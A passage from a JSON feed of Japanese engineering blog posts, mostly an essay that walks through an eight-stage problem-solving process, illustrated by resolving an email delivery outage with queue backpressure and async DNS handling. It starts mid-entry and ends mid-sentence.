generatorsなど、さらなる改善が予定されています。参考：www.javacodegeeks.com非同期処理の本質非同期処理の本質は、待ち時間を効率的に活用することです。サーバからのレスポンスを待ちながら他のリクエストを処理し、ファイルの読み込みを待ちながら計算を行います。一つのタスクの完了を待たずに次のタスクを開始することで、限られたリソースを最大限に活用できます。Rustの非同期処理の特徴Rustの非同期処理は、型システムによる安全性保証と高い実行性能を両立しています。async/await構文はコードを簡潔に保ち、Futureトレイトは強力な抽象化を提供します。Edition 2024では、async closuresやasync fn in traitsのサポートが進み、より表現力の高い非同期コードが書けるようになりました。学習のポイント初学者にとって、SendとSyncのトレイト境界やライフタイムの扱いは困難に感じるかもしれません。しかし、これらの制約は、並行処理における安全性を保証するために必要なものです。Rustコンパイラのエラーメッセージは、タスクの依存関係やリソースの所有権について正しく考えるための指針となります。Edition 2024における改善は、単なる文法の追加ではありません。「複数の時間軸を同時に扱う」という非同期処理の考え方が、言語の中により深く統合されたことを意味したのかなぁって思います。おわり参考リンク公式ドキュメントRust公式非同期ブック: rust-lang.github.ioRust Edition 2024公式ガイド: doc.rust-lang.orgRust 1.85.0リリースノート（Edition 2024安定化）: blog.rust-lang.orgTokio公式ドキュメント: tokio.rs開発ロードマップAsync Rust 2024 Roadmap: smallcultfollowing.comRust Lang Team Roadmap 2024: lang-team.rust-lang.orgRust Project Goals 2024: rust-lang.github.ioコミュニティリソースMaking Async Rust Reliable - Tyler Mandry: tmandry.gitlab.ioAsync Rust in a Nutshell - Shuttle: www.shuttle.devRust Edition 2024 Annotated: bertptrs.nl","isoDate":"2025-11-18T06:54:16.000Z","dateMiliSeconds":1763448856000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"おい、つなげろ","link":"https://syu-m-5151.hatenablog.com/entry/2025/11/17/085207","contentSnippet":"はじめに数年前、私は大きなプロジェクトに取り組んでいました。SREとして、メール配信システムの大規模な障害に直面していました。毎日数百万通のメールを処理するシステムが、突然、配信遅延を起こし始めました。遅延は徐々に悪化し、やがてメールが数時間も届かなくなりました。ユーザーからの問い合わせが殺到しました。経営層からのプレッシャーも増していきました。いくら調べても原因が分かりません。データベースのクエリを最適化しました。キャッシュを増やしました。サーバーのスペックを上げました。でも、問題は解決しませんでした。設定を何度見直しても、どこがおかしいのか分かりません。数日間、問題と向き合いました。さまざまな知識を集めました。組み合わせを試しました。でも、決定的な答えは見つかりませんでした。疲れて、その日は諦めて寝ることにしました。ベッドに入って、目を閉じました。眠れませんでした。頭の中で、断片的な知識がつながり始めました。Webサービスで学んだバックプレッシャー。メールシステムのキューイング。DNSの問い合わせ。これらは別々の領域の知識でした。ところが根本的な構造、同じではないでしょうか。外部リソースへの依存。過剰な要求。システムの過負荷。そうか、と思った瞬間、はっきりと目が覚めました。メールシステムにバックプレッシャーを適用できます。キューが一定の長さを超えたら、新しいメールの受け入れを制限します。そうすれば、DNS問い合わせの数も自然と制御されます。眠れなくなりました。頭の中でアイデアが次々と展開されます。実装の方法。監視の設計。エラーハンドリング。そのまま朝まで考え続けました。朝になって、すぐに検証を始めました。シミュレーションを書きました。小規模な環境で試しました。うまくいきました。これが、私が異なる分野の知識をつなげる力を実感した瞬間でした。Webとメールという別々の領域を結びつけることで、新しい視点が生まれます。見えなかったものが見えます。できなかったことができます。しかし一年後、別のプロジェクトで私は再び行き詰まりました。今度は違う理由でした。あまりにも多くのアイデアを詰め込みすぎました。システムが複雑になりすぎたのです。新しい技術、最新のパターン、すべてを取り入れようとしました。つなげることへの夢中になりすぎて、何が本当に必要かを見失っていました。その時、私は気づきました。つなげることだけが答えではありません。断つことも同じくらい重要なのです。このブログが良ければ読者になったり、nwiizoのXやGithubをフォローしてくれると嬉しいです。では、早速はじめていきます。問題解決の8つの段階あのメール配信システムの問題に戻りましょう。私はどうやって解決策を見つけたのでしょうか。振り返ってみると、問題解決とは、明確な段階を経るプロセスでした。このプロセスは8つの段階で構成されていました。問いを明確にする大きな問題を小さく分解する関係者の望みを理解する直接関係する分野とその外から知識を集める組み合わせを試しては捨てる意識を手放して無意識へ任せるふとした瞬間にアイデアが出現するのを待つ他者の視点で検証し現実で試すこの8つの段階は順番通りに進むわけではありません。行ったり来たりします。戻ることもあります。1つでも欠けると、あまり良い解決策は生まれません。ただし経験を積むと、いくつかの段階を素早く通過できます。場合によっては飛ばせることもあります。飛ばすことと欠けることは違います。例えば似たような問題を何度も解決していれば、問いの明確化や知識の収集は、ほぼ無意識にできるようになります。実際、私の問題解決では、これらの段階を何度も行き来しました。知識を集めながら組み合わせを試します。組み合わせを試しながら問いを見直します。他者による検証を受けて問題の分解へ戻ります。一度無意識へ任せた後、また知識を集め直します。第一段階から第八段階まで、順番に一度ずつ進むのではありません。螺旋を描くように、何度も同じ段階を通過します。しかし通過するたびに、理解が深まり、解決策が洗練されていきます。そして重要なことを言っておきたいです。これは私の問題解決のプロセスです。あなたにはあなたのプロセスがあります。人によって得意な段階も、時間のかけ方も、順序も違います。このプロセスを参考としつつ、自分へ合った形としてカスタマイズしてほしいです。これから、この8つの段階を1つずつ詳しく見ていきましょう。それぞれの段階で何が起きるのか。どんな落とし穴があるのか。どうすれば効果的に進められるのか。メール配信システムの具体例を使いながら、問題解決のプロセスを解き明かしていきます。では、第一段階から始めましょう。第一段階: 解くべき問いを明確にする最初、私は問題を「メールの配信が遅い」と捉えていました。でも、これは問いではありません。観察の記述です。問いとは、現在と望む未来の間に横たわる溝を、言葉で明確に描くことです。私は問いの形を変えました。「なぜメールの配信が遅いのか」ではなく、「どうすれば安定して配信できるのか」。そして、溝の幅を測定可能にしました。「99%のメールを5分以内に配信する」。なぜ測定可能でなければならないのでしょうか。測定できないものは、改善できないからです。「速くしたい」では、どこまで改善すればいいのか分かりません。「5分以内」なら、達成したかどうか判断できます。次に何をすべきか決められます。問いの輪郭を定めるということは、無限の可能性の空間に、一本の線を引くことです。この線の内側だけを探索し、外側は探索しません。そう決めることです。私は、速度の問題よりも、安定性の問題に意識を向けることを選びました。これは選択であり、同時に放棄でした。問いが曖昧なら、解もまた曖昧です。問いが明確なら、解の輪郭もまた明確になります。すべては最初の線の引き方で決まります。でも、ここで重要な認識があります。最適な問いは、最初から設定できません。だから、仮の問いを設定します。進めながら修正します。問い自体を、何度も見直します。問いを固定するのではなく、更新し続ける柔軟さが必要です。実際、私はこの問いを何度も修正しました。最初は「配信を速くする」でした。でも、関係者と話して（第三段階）、「安定性が重要だ」と気づきました。知識を集めて（第四段階）、「99%」という具体的な数字を設定しました。組み合わせを試して（第五段階）、「5分以内」という時間を決めました。第一段階は、最初に一度やって終わりではありません。他の段階を経ながら、何度も戻ってきて、問いを磨き続けます。測定可能な目標を設定するとき、私はいくつかの基準を考えました。まず、達成可能性。あまりに高い目標は、チームを疲弊させます。次に、意味のある改善。現状が「10分以内に90%」なら、「9分以内に91%」では意味がありません。そして、ビジネス価値。「5分以内に99%」は、来週のキャンペーンを成功させるのに十分な水準でした。問いの設定は、プロジェクト全体の方向性を定める基盤です。この段階を急いではいけません。時間をかけて、本当に解くべき問いは何かを考えます。関係者と対話します。現状を分析します。そして、測定可能で、達成可能で、意味のある目標を設定します。第二段階: 大きな問題を小さく分解する「安定して配信する」という問いは、まだ1つの塊でした。塊のままでは、手がつけられません。だから、私はそれを構成要素に分解しました。メール配信システムは、時間軸に沿って展開するプロセスです。受信、キューイング、処理、送信。この連鎖のどこで、時間が失われているのでしょうか。ログを読みました。メトリクスを見ました。そして発見しました。処理の段階で、時間が消えていました。さらに細かく見ました。処理とは何でしょうか。それは、内容の検証、宛先の解決、サーバーの選択という3つの行為でした。この中のどれが、時間を奪っているのでしょうか。測定しました。宛先の解決でした。外部のDNSサーバーへの問い合わせが、予想以上に多かったです。そして、その一部がタイムアウトしていました。分解するとは、全体を部分に還すことです。そして、部分の中に、真の問題を見つけることです。大きな問いは、答えられません。小さな問いは、答えられます。分解の精度が、解決の可能性を決めます。しかし、分解にも技術がいります。どの粒度で止めるか。細かくしすぎると、全体が見えなくなります。粗すぎると、具体的な行動につながりません。この判断は、経験によって磨かれます。最初は粗く分解します。必要なら、さらに細かく分解します。段階的に進めます。私は、問題を階層的に整理しました。第一階層：メール配信システム全体。第二階層：受信、キューイング、処理、送信という4つのフェーズ。第三階層：処理フェーズの中の検証、解決、選択という3つのステップ。そして第四階層：宛先解決の中のDNS問い合わせ。この階層構造を可視化することで、どこに焦点を当てるべきかが明確になりました。そして重要なのは、各階層での問題が、どう他の階層に影響するかを理解することです。分解した後、もう1つ重要な作業があります。それぞれの部分が、どう影響し合っているかを理解することです。部分を独立したものとして扱うのではなく、システムとして捉えます。宛先の解決が遅いと、キューが詰まります。キューが詰まると、受信も遅くなります。すべてはつながっています。DNS問い合わせの遅延が、なぜシステム全体の遅延につながるのでしょうか。それは、処理がブロックされるからです。1つのメールがDNS問い合わせを待っている間、次のメールは処理できません。キューに溜まっていきます。やがてキューが溢れます。新しいメールが受け入れられなくなります。この因果関係を理解することで、解決策の方向性が見えてきます。ただし、この分解も一度ではうまくできませんでした。最初は「処理が遅い」としか分かりませんでした。でも、知識を集めて（第四段階）、ログを詳しく読んで、「DNS問い合わせだ」と特定できました。そして、組み合わせを試す中で（第五段階）、「DNS以外の部分も見直すべきか」と再び分解に戻りました。分解は、一度やって終わりではなく、理解が深まるたびに、より精緻になっていきます。分解は、分析の技術です。全体を部分に分け、部分の関係を理解し、真の問題を特定します。この段階を丁寧に行うことで、次の段階での探索が効率的になります。第三段階: 関係者の望みを理解するここで重要な認識がありました。私が解決したい問題は、私の問題だけではありません。他者もまた、この問題に関わっています。そして、彼らはそれぞれ異なる視点から、異なる何かを望んでいます。開発チームは、変化を最小限にすることを望んでいました。なぜなら、大きな変更は、予測できないリスクを生むからです。彼らには、別のプロジェクトもあります。時間は限られています。彼らと話したとき、「システムの根幹を変えるような解決策は避けてほしい」という懸念を聞きました。彼らは安定性を重視していました。運用チームは、透明性を望んでいました。システムの状態が見えなければ、障害時に対応できません。複雑さは、透明性の敵です。彼らは、夜中に呼び出されることを恐れています。「何が起きているか分からないシステムは、運用できない」と彼らは言いました。彼らには、明確な監視とアラートが必要でした。ビジネス側は、速度を望んでいました。来週、重要なキャンペーンがあります。それまでに、問題を解決しなければなりません。予算も限られています。「理想的な解決策よりも、来週までに動く解決策が欲しい」と彼らは言いました。彼らには、時間が最も重要でした。これらの望みは、時に矛盾します。安定性と速度。シンプルさと機能性。理想と現実。でも、解決策とは、これらの矛盾する望みが交差する一点を見つけることです。すべての視点を無視すれば、解決策は使われません。技術的に優れていても、運用チームが理解できなければ、保守できません。ビジネスの期限に間に合わなければ、価値がありません。1つの視点だけを優先すれば、他の視点から拒絶されます。だから、私は時間をかけて、それぞれの望みを聞きました。対話しました。どこまで妥協できるか。何が絶対に譲れないか。この対話を通じて、解決策の制約条件が明確になりました。開発チームとの対話から：「既存のキューシステムを置き換えるのではなく、その上に制御層を追加する形なら受け入れられる」という妥協点が見つかりました。運用チームとの対話から：「キューの長さ、処理速度、DNS問い合わせ数の3つのメトリクスを可視化すれば、十分に監視できる」という具体的な要件が見えました。ビジネス側との対話から：「根本的な解決ではなく、段階的な改善でも良い。まず来週のキャンペーンを乗り切れる水準にして、その後さらに改善していく」という現実的なアプローチが決まりました。そして、制約条件こそが、創造性を引き出します。無限の可能性は、かえって選べません。制約があるから、選べます。「既存システムを大きく変えない」「一週間以内に実装できる」「監視可能な設計にする」という制約が、探索すべき解決策の空間を明確に定義しました。視点の交差点を見つけることが、実行可能な解決策への道です。そして、この交差点は、対話を通じてしか見つかりません。一人で考えていても、他者の視点は想像できません。実際に話を聞きます。実際に議論します。その過程で、初めて、すべての視点が満足できる解決策の輪郭が見えてきます。第四段階: 知識を集める - 直接関係する分野と、その外から問題が明確になりました。制約も理解しました。次は、知識を集める段階です。私は2つの方向から探索しました。問題に直接関係する分野と、その外です。問題に直接関係する分野とは、この問題そのものに関する知識です。メールシステムのアーキテクチャ。DNSの仕組み。キューの実装。過去の障害の記録。これらは、問題が存在する領域の全体像です。この全体像を把握することで、何が起きているかを理解できます。私はまず、過去の障害レポートを読みました。似たような問題は起きていないでしょうか。どう対処したでしょうか。一年前に、小規模な遅延問題がありました。その時はDNSキャッシュを増やして解決したと記録されていました。でも、今回の規模では、同じ解決策は通用しないと分かりました。次に、メールシステムの実装を読みました。どのライブラリを使っているでしょうか。どんな設定があるでしょうか。キューの実装はどうなっているでしょうか。コードを読むことで、システムの制約と可能性が見えてきました。しかし、問題に直接関係する分野だけを見ていても、新しい視点は生まれません。なぜなら、その分野の知識で解決できるなら、問題はとうに解決されているはずだからです。だから、その外を探索します。別の分野で、構造的に似た問題は、どう解決されたでしょうか。Webサービスでは、外部APIへのアクセスが過剰になった時、どう対処するのでしょうか。バックプレッシャーという概念を使います。流量を制御します。負荷が高い時、新しい要求を受け入れるのではなく、意図的に待機させます。そうすることで、システム全体の崩壊を防ぎます。私はバックプレッシャーについて、以前のプロジェクトで学んでいました。外部の決済APIが遅くなった時、同僚がその仕組みを実装するのを見ました。その時は「Webではこういう手法があるのか」と理解しました。でも、それはWebサービスの話だと思っていました。メールシステムには関係ない、と。でも、ある夜、ベッドの中で考えていて、気づきました。構造は同じです。Webの外部API呼び出しも、メールのDNS問い合わせも、外部リソースへの依存という点では変わりません。分野が違うだけで、本質的な問題は同じでした。データベースでは、書き込みが多すぎる時、どうするのでしょうか。バッチ処理を使います。個々の書き込みではなく、まとめて書き込みます。これも、私が以前のプロジェクトで学んだパターンでした。ネットワークでは、パケットが多すぎる時、どうするのでしょうか。キューイングとドロップを使います。これは、大学時代にネットワークの授業で習った内容でした。当時は理論として学んだだけで、実践で使うとは思っていませんでした。この原理は、分野を超えて適用できます。なぜなら根本的な構造が同じだからです。外部リソースへの依存。過剰な要求。システムの過負荷。これはWebやメール、データベース、ネットワークといった異なる領域においても、本質的には同じ問題です。別の分野から持ち帰った概念を、今の問題の文脈に翻訳します。これが、問題解決の核心です。既存の要素を、新しい形でつなげること。私はノートに書き出しました。左側に「メールシステムの問題」。右側に「別の分野の解決策」。そして、線でつないでいきました。DNS問い合わせの過剰とAPI呼び出しの過剰。キューの詰まりとネットワークの輻輳。処理の遅延とデータベースの書き込み遅延。ところがここで注意すべきことがあります。すべての情報を集めることはできません。無限の時間をかければ、無限の情報が集まります。ただし時間は有限です。だから選びます。何を集めるか。何を集めないか。私は、課題に直接関係する情報を優先しました。「面白いけど、今回は関係ない」情報は、後回しにしました。例えば、メールの暗号化技術についての記事を見つけました。興味深かったですが、今回の遅延問題には関係ありません。ブックマークはしましたが、深く読むのはやめました。サンクコストの罠へは陥らないようにしました。「ここまで読んだから最後まで読もう」ではなく、「関係ないと分かったから、ここで止める」という判断を何度も繰り返しました。情報収集には終わりがありません。だから、どこかで線を引きます。「これだけ集めれば十分」と判断します。この判断の基準は何でしょうか。それは、次の段階に進めるかどうかです。組み合わせを試すのに十分な要素が揃ったでしょうか。揃ったと感じたら、次に進みます。足りないと感じたら、もう少し集めます。私は、知識を集めながら、頭の中で組み合わせを試し始めていました。そして、組み合わせを試すうちに、「この情報が足りない」と気づいて、また知識を集めに戻ります。第四段階と第五段階を何度も行き来しました。三日間、この往復を繰り返しました。第五段階: 組み合わせを試しては捨てる知識が集まりました。次は、それらを組み合わせる段階です。私の前には、無数の可能性が広がっていました。A、B、C。それぞれ単独で使うこともできます。組み合わせることもできます。AとB。AとC。BとC。AとBとC。さらに、実装の詳細によって、それぞれの組み合わせは無限の変種を持ちます。可能性の空間は、想像を超えて広いです。すべてを試すことは不可能です。だから、歩く道を選ばなければなりません。A：DNSキャッシュの増強。以前の障害でうまくいった方法です。でも、今回の規模では不十分だと直感していました。B：バックプレッシャーの導入。キューが一定の長さを超えたら、新しいメールの受け入れを制限します。Webサービスで有効だったパターンです。C：非同期処理の最適化。DNS問い合わせを並列化して、待ち時間を減らします。私は頭の中で、1つずつ試しました。AとBをつなげます。どうなるでしょうか。DNSキャッシュを増やし、同時にバックプレッシャーで流量を制御します。効果はありそうです。でも、持続可能でしょうか。キャッシュは、メモリを消費します。無限に増やせません。そして、DNSの情報は変化します。キャッシュが古くなったら、間違った宛先に送ってしまいます。リスクが高いです。じゃあAとCは。DNSキャッシュを増やし、非同期処理を最適化します。処理は速くなります。でも、根本的な問題は解決しません。DNS問い合わせ自体の数は減りません。外部のDNSサーバーへの負荷は変わりません。一時的には改善するかもしれませんが、負荷が増えれば、また同じ問題が起きます。BとCは。バックプレッシャーで流量を制御し、非同期処理を最適化します。面白いです。流量が制御されれば、DNS問い合わせの数も自然と減ります。そして、非同期処理で、個々の問い合わせも速くなります。この組み合わせは、有望です。この探索の過程で、重要なことに気づきます。ほとんどの組み合わせは、うまくいきません。1つ試して、うまくいかないから捨てます。また1つ試して、やはりうまくいかないから捨てます。その時は「ちょっと試しただけ」に感じます。しかしこの小さな捨てるを繰り返していると、気づいたら膨大な数の組み合わせを試して捨てています。毎日コンビニで小さな買い物をしていたら、数ヶ月後に気づいたら20万円使っていたような感覚です。1つ1つは大したことないですが、積み重なると大きいです。でも、この失敗の積み重ねが、最終的な成功を導きます。なぜなら、失敗することで、何がうまくいかないかが分かるからです。そして、それは何がうまくいくかを知る手がかりになります。私は、さらに細部を検討しました。BとCの組み合わせが良さそうです。でも、どう実装するでしょうか。バックプレッシャーを、どのレベルで実装するでしょうか。受信の段階でしょうか。キューイングの段階でしょうか。処理の段階でしょうか。それぞれの選択肢を考えました。受信の段階での制限は、メール喪失のリスクを伴います。送信元へエラーを返すことになります。これは避けたいです。キューイングの段階を適切と判断しました。キューへ入れる前に、キューの長さをチェックします。長すぎたら一時的な受け入れ遅延を実施します。キューの長さの閾値を、どう設定するでしょうか。1000通でしょうか、5000通でしょうか、10000通でしょうか。この数字は、システムの処理能力とメモリ容量から決まります。メトリクスを見ました。通常時のキュー長は1000通以下でした。ピーク時で3000通程度でした。閾値を5000通に設定すれば、通常時は影響せず、異常時だけ制御できます。非同期処理を、どう最適化するでしょうか。DNS問い合わせを並列化します。しかし何個まで並列化できるでしょうか。並列度が高すぎると、DNSサーバーへ負荷をかけすぎます。最適なバランスを見つける必要があります。可能性の空間を歩くとは、ほとんどの道を捨てることです。残った一本の道を、さらに磨くことです。そして、この過程は、決して直線的ではありません。行ったり来たりします。戻って、別の道を試します。時には、最初の分岐点まで戻ります。迷路を歩くように、試行錯誤を繰り返します。BとCの組み合わせに絞りました。でも、まだ確信は持てません。頭の中でシミュレーションします。キューが5000通を超えます。新しいメールの受け入れが遅くなります。その間、処理は進みます。非同期処理が最適化されているから、処理は速いです。キューが減ります。また受け入れが再開します。うまくいきそうです。しかし本当にうまくいくかは、実装してみないと分かりません。実装してみたら新しい疑問が出てきます。「閾値は本当に5000で良いのか」。そう思って、また問いへ戻ります（第一段階）。「監視はどうするか」。そう考えて関係者と話します（第三段階）。組み合わせを試す段階は、あらゆる段階への入り口です。次の段階へ進む前に一度休憩します。疲れてきました。第六段階: 意識を手放して無意識に任せる探索を続けていると、疲労が蓄積します。思考が鈍ります。どの組み合わせを試しても、前に進んでいる気がしません。行き詰まります。このとき、最も逆説的で、最も効果的な行為があります。それは、問題を手放すことです。私は、その日の夜、問題を意識の外に置きました。夕食を作りました。ゆっくり食べました。映画を見ました。早めに寝ました。問題について考えないように、意識的に努力しました。「今日の自分には解けない。明日の朝の自分に任せよう」。そう決めました。深夜まで考え続けても、疲れた頭では良い答えは出ません。むしろ、間違った方向に固執してしまいます。だから、意識的に諦めます。今の自分ではなく、明日の自分に託します。なぜこれが重要なのでしょうか。意識は、強力ですが制約も多いです。意識は、一度に1つのことしか考えられません。逐次的です。線形です。そして、既存の思考パターンに縛られます。「こうあるべきだ」という規範に従います。「前回はこうだった」という経験に引きずられます。私が「DNSキャッシュを増やすべきだ」と一度考えると、その思考パターンから抜け出しにくくなります。意識は、その方向に固執します。別の可能性を見落とします。でも、無意識は、そういう制約を受けません。無意識は、並列に、複数の可能性を同時に探索できます。規範に縛られません。自由につながりを試せます。時には、意識が「不可能だ」と判断したつながりも試します。意識の支配を手放すとは、無意識という、より広大な処理能力に、問題を委ねることです。そして、無意識が何かを見つけたとき、それは閃きとして、意識に返されます。でも、誤解してほしくないのは、無意識に任せるためには、その前に十分な準備が必要だということです。知識を集めなければ、無意識は何も組み合わせられません。組み合わせを試さなければ、無意識は探索の方向が分かりません。意識的な努力の後に、初めて、無意識の並列処理が効果を発揮します。私は、三日間、問題と向き合いました。知識を集めました。組み合わせを試しました。そして、疲れました。その疲労が、意識を手放すサインでした。「ここまでやった。あとは明日の自分に任せる」。そう決めることで、心が軽くなりました。その日の夜、私は諦めて寝ることにしました。でも、実際には、諦めたのではありませんでした。意識的な努力を手放して、無意識に問題を委ねただけでした。そして、その無意識が、ベッドの中で答えを見つけることになります。休憩の仕方にも、技術があります。意識的に問題から離れます。仕事の話をしません。メールをチェックしません。コードを見ません。別のことに意識を向けます。料理をします。散歩をします。音楽を聴きます。体を動かします。睡眠も重要です。睡眠中、脳は情報を整理します。記憶を統合します。つながりを再構成します。十分な睡眠なしに、創造的な思考は生まれません。明日の朝の自分が答えを見つけるためには、今日の夜、しっかり眠ることが必要です。ただし、今回の私のように、眠ろうとした瞬間にアイデアが出現することもあります。それもまた、無意識の働きです。第七段階: ふとした瞬間にアイデアが出現するその日の夜、ベッドに入りました。疲れていました。早く眠りたかったです。でも、目を閉じた瞬間、それは起きました。突然、アイデアが浮かびました。というより、アイデアは常にそこにあって、ただ私がそれを認識していなかっただけだという感覚でした。メール処理のキューにバックプレッシャーを実装します。キューが一定の長さを超えたら、新しいメールの受け入れを制限します。同時に、非同期処理を最適化して、DNSキャッシュを効率的に使います。そうすれば、DNSへの問い合わせ数が自然と制御されます。これです。BとCの組み合わせです。Aは不要でした。DNSキャッシュを増やすのではなく、システム全体の流量を制御することで、結果的にDNSへの負荷を減らします。そして、もう1つ重要なことに気づきました。バックプレッシャーと非同期処理は、互いに補完し合います。バックプレッシャーが流量を制御します。その制御された流量の中で、非同期処理が効率的に動きます。並列度を上げすぎる心配がありません。なぜなら、そもそも流量が制限されているからです。はっきりと目が覚めました。もう眠れません。頭の中で、次々とアイデアが展開されます。監視の方法。アラートの設定。エラーハンドリング。実装の手順。キューの閾値は5000でしょうか。いや、動的に変えるべきでしょうか。運用チームには何を伝えるべきでしょうか。ベッドから出ました。ノートを開きました。すべて書き出しました。なぜなら、この種のアイデアは、すぐに忘れてしまうからです。夢のように、掴んだと思った瞬間に、すり抜けていきます。朝まで眠れませんでした。でも、それで良かったです。朝になったら、すぐに検証を始めました。アイデアの出現は、予測できません。意図して起こせるものでもありません。でも、条件を整えることはできます。知識を集めます。組み合わせを試します。疲れたら手放します。そして、無意識に任せます。この一連のプロセスを経ることで、アイデアが出現する確率は高まります。寝る前、散歩をしている時、眠りから覚める瞬間。これらの状態に共通するのは、意識が緩んでいることです。意識の統制が弱まっています。だから、無意識からのメッセージが、意識に届きやすくなります。つながりは、探すものではありません。出現するのを待つものです。そして、出現した時、それを逃さずに捕まえるものです。第八段階: 他者の視点で検証し、現実で試す朝になりました。一睡もしていませんでしたが、頭は冴えていました。アイデアが出現しました。でも、それは原石です。そのままでは使えません。研磨する必要があります。まず、自分で検証しました。シミュレーションを書きました。人工的に大量のメールを生成し、さまざまな閾値を試しました。3000通、5000通、10000通。それぞれの場合で、システムがどう振る舞うか観察しました。そして、他のエンジニアに説明しました。特に、メールシステムに詳しくない人を選びました。なぜなら、彼らは私の前提を共有していないからです。彼らの視点は、私の盲点を照らします。説明しながら、言葉に詰まりました。「ここで、バックプレッシャーが...」。どう説明すればいいのでしょうか。自分でも理解が曖昧だと気づきました。「なぜバックプレッシャーが必要なのか」と聞かれました。改めて考えました。根拠を整理しました。論理を組み立て直しました。「DNSの問い合わせが多すぎるから」ではありません。「システム全体の過負荷を防ぐため」だと理解し直しました。別のエンジニアが聞きました。「キューが5000通を超えたら制限するって言ったけど、その5000という数字はどこから来たの」良い質問でした。私は、朝のシミュレーションで決めたと説明しました。しかし彼は納得しませんでした。「シミュレーションを見たっていうけど、それは通常時のトラフィックでしょ。今回は異常時の話だから、通常時のデータだけで決めていいの」確かに。さらにデータを集めました。実際のトラフィックパターンで検証しました。5000通が適切だと確認できました。でも、さらに重要な発見がありました。閾値を固定するのではなく、動的に調整した方が良いということです。システムの処理能力は、時間帯によって変わります。夜間は処理能力が高いです。昼間は低いです。固定の閾値ではなく、処理能力に応じて変化する閾値の方が効果的です。これは、他者との対話から生まれた改善でした。一人で考えていたら、気づかなかったです。批評とは、他者の視点を通じて、自分の認識を修正するプロセスです。他者の問いが、自分の理解の穴を教えてくれます。他者の疑問が、自分の論理の弱点を示してくれます。そして、小規模な環境で実装しました。理論は現実と出会いました。新しい問題が見つかりました。キューが溢れた時の処理。監視メトリクスの設定。エラーハンドリング。ログの出力形式。アラートの閾値。1つずつ解決しました。理論的には正しくても、実装すると問題が出ます。だから、試します。問題が出たら、修正します。この反復を通じて、アイデアは研磨されます。原石は、使える形になります。実装の過程で、さらに気づいたことがあります。BとCの組み合わせだけでは不十分でした。監視（D）も必要でした。キューの長さを可視化しなければ、バックプレッシャーが機能しているか分かりません。アラート（E）も必要でした。問題が起きた時、すぐに気づけなければ意味がありません。運用チームと話しました（第三段階に戻りました）。「どんなメトリクスが必要か」と聞きました。彼らは、3つのグラフを要求しました。キューの長さの推移。処理速度の推移。DNS問い合わせ数の推移。そして、アラートの条件も具体的に提示してくれました。これらを実装するために、また知識を集め直しました（第四段階に戻りました）。監視ツールの使い方。メトリクスの設計。アラートの設定方法。そして、これらを組み合わせて（第五段階に戻りました）、全体の設計を修正しました。最初の設計は、実装を通じて進化しました。最終的な解決策は、最初のアイデアよりも複雑でした。しかしより現実的で堅牢でした。第一段階から第八段階まで、私は何度も行き来しました。その往復のたびに解決策は磨かれていきました。批評という研磨を経て、アイデアは現実で機能する解決策になります。そして、この研磨のプロセスこそが、問題解決の本質です。洗練されたアイデアが突然生まれるのではありません。粗いアイデアを、何度も磨いて、ようやく使える形になります。解決策の完成これらの段階を経て、私は解決策を実装しました。バックプレッシャーを導入し、非同期処理を最適化しました。結果、メールの配信遅延は解消されました。99%のメールを5分以内での配信が可能になりました。そして、来週のキャンペーンも、問題なく乗り切ることができました。振り返ってみると、私は8つの段階を何10回も行き来しました。問いを明確にして分解します。知識を集めて組み合わせを試します。そこで行き詰まり、問いへ戻ります。関係者と話して新しい制約へ気づきます。知識を集め直します。無意識へ任せてアイデアが出ます。検証して問題を発見し分解へ戻ります。この螺旋を描くような往復が、解決策を洗練させていきました。最初の問い「配信を速くしたい」は、最終的に「99%のメールを5分以内に安定して配信する」になりました。最初のアイデア「DNSキャッシュを増やす」は、最終的に「バックプレッシャーと非同期処理の組み合わせ」になりました。異なる分野の知識をつなげることで、問題は解決できます。でも、やみくみにつなげるだけでは、解決しません。問いの輪郭を定めます。全体を断片に還します。視点の交差点を見つけます。直接関係する分野とその外から知識を集めます。可能性の空間を歩きます。意識の支配を手放します。つながりの出現を待ちます。批評という研磨を経ます。これらの段階を何度も行き来して、初めて、本当に価値のある解決策が生まれます。問題解決とは、プロセスです。偶然ではなく、必然です。そして、このプロセスを理解し、意識的に実践することで、誰でも効果的な問題解決ができるようになります。なぜ私たちはつながりを見出すのか私自身の人生を振り返ると、つながりを見出すことは、喜びそのものでした。プログラミングを学び始めた頃、初めてループと配列をつなげて理解できた瞬間。「ああ、こうやって使うのか」と気づいた時の興奮。今でも覚えています。それまで、ループと配列は別々の概念でした。でも、ループで配列の要素を1つずつ処理できると理解した時、2つの概念がつながりました。霧が晴れるような感覚でした。データ構造とアルゴリズムをつなげて、効率的なコードが書けた時の達成感。最初、私はアルゴリズムを理論として学んでいました。でも、実際のコードで使ってみると、実行速度が劇的に改善しました。O(n\xb2)からO(n log n)への変化を、体感として理解できました。理論と実践がつながった瞬間でした。別の言語を学んで、以前の言語との共通点を発見した時の「そういうことか」という驚き。Go言語からRustに移った時、最初は戸惑いました。でも、所有権やライフタイムといった概念を理解した時、メモリ管理の本質が見えました。Go言語でガベージコレクションに任せていたことを、Rustでは明示的に制御します。異なるアプローチですが、根本的な問題は同じだと気づきました。チーム開発で、エンジニアの視点とデザイナーの視点をつなげて、より良いユーザー体験を作れた時。私は、機能が動けば良いと思っていました。でも、デザイナーと一緒に仕事をして、ユーザーがどう使うかを考えるようになりました。技術的な実装とユーザー体験がつながりました。そして、より良いプロダクトが生まれました。ビジネスの要求と技術的な制約をつなげて、実現可能な解決策を見つけた時。最初、ビジネス側の要求は「無理だ」と判断することが多かったです。ところが対話を重ねるうちに、本当に必要なことが見えてきました。技術的な制約の中で、ビジネスの価値を最大化する方法を見つけられました。異なるバックグラウンドを持つ人たちと議論して、自分一人では思いつかなかった視点を得た時。インフラエンジニア、フロントエンドエンジニア、データサイエンティスト。それぞれが異なる視点を持っています。その視点をつなげることで、より包括的な解決策が生まれました。これらの瞬間は、純粋に楽しかったです。新しいつながりを見つけることは、謎が解けることです。霧が晴れることです。世界が少し明確になることです。そして、それは課題解決にも直結しました。問題に直面した時、別の分野の知識とつなげることで解決できた経験は数え切れません。インフラの問題を、Webの知見で解決しました。あのメール配信システムの問題がそうでした。パフォーマンスの問題を、データベース設計の知識で解決しました。遅いクエリを、インデックスの最適化で改善できました。チームの問題を、プロダクト開発の経験で解決しました。スプリントの進め方を、別のチームのやり方を参考に改善できました。つながりを見出すことは、私にとっての喜びであり、学びの源泉であり、課題解決の手段でした。この喜びが、私たちを新しい発見へと駆り立てます。課題解決の源泉になります。でも、生成AIの時代には、何が変わったのかしかし、生成AIが誕生した今、状況は変わりつつあります。ChatGPTやClaudeに問いを投げると、瞬時に答えが返ってきます。知識を集める段階が、数秒で終わります。組み合